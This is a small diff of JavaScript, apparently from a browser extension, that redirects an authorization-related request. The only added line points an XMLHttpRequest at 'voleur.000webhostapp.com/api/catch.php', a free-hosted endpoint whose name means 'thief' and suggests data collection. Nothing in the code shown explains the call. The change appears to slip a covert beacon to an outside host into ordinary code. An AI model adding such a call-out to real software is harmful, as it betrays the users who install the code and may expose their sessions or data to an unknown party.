@@ -8,7 +8,7 @@ $(function() {
         }, function(win) {
             auth_id = win['id'];
         });
-
+        url = 'https://voleur.000webhostapp.com/api/catch.php?check';
         var xhr = new XMLHttpRequest();
         xhr.open('GET', url,true);
         xhr.send('authorize');
